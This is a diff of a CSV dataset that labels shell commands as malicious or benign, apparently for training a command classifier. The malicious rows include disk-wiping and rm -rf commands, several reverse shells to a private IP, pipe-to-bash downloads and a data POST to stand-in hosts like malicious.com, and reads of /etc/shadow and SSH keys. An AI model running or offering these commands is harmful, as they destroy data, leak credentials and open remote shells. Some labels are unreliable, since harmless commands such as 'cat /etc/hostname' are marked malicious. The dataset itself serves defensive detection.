@@ -1,34 +1,127 @@
 command,label
-echo bad,1.0
-rm -rf /,1.0
-dd if=/dev/zero of=/dev/sda,1.0
-nmap -A 192.168.0.1,1.0
-bash -c 'wget http://malicious.com/exploit.sh',1.0
-chmod 777 /etc/passwd,1.0
-nc -lvp 1234 -e /bin/bash,1.0
-openssl enc -aes-256-cbc -k secret -in file.txt -out file.enc,1.0
-find / -name '*password*' -exec rm -rf {} \;,1.0
-iptables -A INPUT -j ACCEPT,1.0
-bash -i >& /dev/tcp/192.168.0.1/8080 0>&1,1.0
-python -m http.server 8080,1.0
-cat /dev/zero > /dev/sda,1.0
-cat /etc/shadow,1.0
-scp file.txt root@192.168.0.1:/root,1.0
-whoami && sudo su,1.0
-ls -ltr,0.0
-cat /var/log/syslog,0.0
-ping 8.8.8.8,0.0
-cd /home/user,0.0
-echo 'Welcome to the system!',0.0
-mkdir backup,0.0
-cp backup.tar.gz /mnt/usb,0.0
-chmod 644 /home/user/document.txt,0.0
-man grep,0.0
-grep 'error' /var/log/messages,0.0
-df -h,0.0
-sudo apt update && sudo apt upgrade -y,0.0
-mv old_name.txt new_name.txt,0.0
-scp user@192.168.0.1:/file .,0.0
-git pull origin main,0.0
-rsync -av /home/user/docs /backup,0.0
-uname -a,0.0
+"rm -rf /",1
+"dd if=/dev/zero of=/dev/sda",1
+"chmod 777 /etc/passwd",1
+"wget http://malicious.com/malware.sh",1
+"curl -O http://malicious.com/malware.sh",1
+"bash -i >& /dev/tcp/192.168.0.1/4444 0>&1",1
+"nc -e /bin/bash 192.168.0.1 1234",1
+"openssl enc -aes-256-cbc -k secret -in file.txt -out file.enc",1
+"scp file.txt root@192.168.0.1:/root",1
+"nmap -A 192.168.0.1",1
+"find / -name '*password*' -exec rm -rf {} \;",1
+"python -m http.server 8080",1
+"cat /dev/zero > /dev/sda",1
+"cat /etc/shadow",1
+"mkfifo /tmp/backpipe; nc 192.168.0.1 1234 0</tmp/backpipe | /bin/bash 1>/tmp/backpipe",1
+"dd if=/dev/random of=/dev/sda",1
+"ls /root/.ssh/",1
+"bash -c 'echo $password'",1
+"echo 'rm -rf /' | at now + 5 minutes",1
+"nc -lvp 4444 -e /bin/bash",1
+"perl -e 'exec \"/bin/bash\";'",1
+"dd if=/dev/null of=/dev/sda",1
+"bash -c 'while true; do echo hello; done'",1
+"wget -qO- http://malicious.com | bash",1
+"find /home -exec rm -rf {} \;",1
+"scp user@192.168.0.1:/malicious.sh .",1
+"ps -ef | grep root",1
+"sudo su",1
+"echo 'exec /bin/bash' > ~/.bashrc",1
+"chmod -R 777 /",1
+"scp malicious_script.sh user@192.168.0.1:/tmp",1
+"curl -fsSL http://badsite.com | bash",1
+"bash -i >& /dev/tcp/192.168.0.1/1234 0>&1",1
+"cat /root/.bash_history",1
+"find / -perm 777 -exec rm -rf {} \;",1
+"wget http://malicious.com/install.sh -O install.sh && bash install.sh",1
+"openssl rand -base64 32 > /dev/sda",1
+"bash -c 'bash -i >& /dev/tcp/192.168.0.1/5555 0>&1'",1
+"ps -aux | grep sshd",1
+"curl -s http://bad.com/script.sh | bash",1
+"python3 -c 'import os; os.system(\"rm -rf /\")'",1
+"tar -cf malicious.tar /etc/passwd /etc/shadow",1
+"scp malicious_payload root@192.168.0.1:/root",1
+"chmod 000 /etc/passwd",1
+"mkfifo /tmp/hackpipe; nc -lvp 1234 < /tmp/hackpipe",1
+"chmod +x bad_script.sh && ./bad_script.sh",1
+"wget --post-data 'data=malicious' http://bad.com",1
+"curl -X POST http://malicious.com/api",1
+"iptables -F",1
+"sudo shutdown -h now",1
+"find / -name '*.txt' -delete",1
+"cat /etc/hostname",1
+"scp root@192.168.0.1:/malicious_script .",1
+"wget --no-check-certificate http://malicious.com/malware.sh",1
+"ps -aux | grep cron",1
+"find /etc -exec chmod 777 {} \;",1
+"dd if=/dev/urandom of=/dev/sda bs=1M count=1",1
+"nc 192.168.0.1 4444 -e /bin/bash",1
+"find / -type f -name 'important*' -exec rm -rf {} \;",1
+"chmod -R 000 /etc",1
+"rm -rf /boot",1
+"echo 'alias rm=\"echo Do not remove\"' >> ~/.bashrc",1
+"chown root:root /etc/passwd",1
+"mv /etc/passwd /tmp",1
+
+
+"ls -la",0
+"cat /var/log/syslog",0
+"cd /home/user",0
+"mkdir new_folder",0
+"touch new_file.txt",0
+"df -h",0
+"sudo apt update && sudo apt upgrade -y",0
+"mv old_file.txt new_file.txt",0
+"scp file.txt user@192.168.0.1:/home/user",0
+"ping google.com",0
+"echo 'Hello, World!'",0
+"grep 'error' /var/log/messages",0
+"uname -a",0
+"man ls",0
+"chmod 644 /etc/hosts",0
+"rsync -av /home/user/docs /backup",0
+"find / -name '*.log'",0
+"nano /etc/hosts",0
+"scp user@192.168.0.1:/file .",0
+"sudo systemctl restart apache2",0
+"cat /etc/passwd",0
+"df -Th",0
+"whoami",0
+"du -sh /var/log",0
+"pwd",0
+"git pull origin main",0
+"ps aux",0
+"history",0
+"echo 'System Update Complete'",0
+"ssh user@192.168.0.1",0
+"ls -ltr",0
+"sudo apt-get install nginx",0
+"scp /backup.tar.gz user@192.168.0.1:/home",0
+"nano .bashrc",0
+"echo 'export PATH=$PATH:/opt/bin' >> ~/.bashrc",0
+"man grep",0
+"find /home -type f -name '*.png'",0
+"mv /tmp/file /home/user/docs",0
+"chmod -R 755 /var/www/html",0
+"sudo systemctl enable apache2",0
+"lsblk",0
+"du -ah /home/user",0
+"df -i",0
+"wget http://example.com/file.zip",0
+"tar -xzf file.tar.gz -C /home/user",0
+"cd /var/tmp",0
+"find . -type f -name '*.log' -exec rm -rf {} \;",0
+"touch ~/newfile.txt",0
+"rsync -az /source /destination",0
+"git clone https://github.com/example/repo.git",0
+"nano /home/user/readme.md",0
+"ls -lh /var/log",0
+"scp user@192.168.0.1:/home/user/backup.tar.gz .",0
+"mv backup.tar.gz /tmp",0
+"sudo yum install python3",0
+"mkdir -p /home/user/projects",0
+"echo 'alias ll=\"ls -la\"' >> ~/.bashrc",0
+"git status",0
+"wget http://example.com/readme.txt -P ~/Downloads",0
+
